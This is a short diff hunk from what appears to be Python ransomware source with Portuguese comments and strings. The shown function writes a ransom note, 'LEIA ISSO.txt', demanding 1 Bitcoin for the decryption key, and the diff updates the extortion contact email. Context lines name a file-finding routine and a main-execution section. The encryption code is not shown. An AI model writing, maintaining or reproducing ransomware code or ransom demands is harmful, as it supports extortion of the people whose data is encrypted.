@@ -34,7 +34,7 @@ def encontrar_arquivos(diretorio):
 def criar_mensagem_resgate():
     with open("LEIA ISSO.txt", "w") as f:
         f.write("Seus arquivos foram criptografados!\n")
-        f.write("Envie 1 Bitcoin para o endereço de email zerofill@proton.me e envie o comprovante.\n")
+        f.write("Envie 1 Bitcoin para o endereço de email zerofill@protonmail.com e envie o comprovante.\n")
         f.write("Após isso, enviaremos a chave para recuperar seus dados!!!")
 
 #6. Execução principal
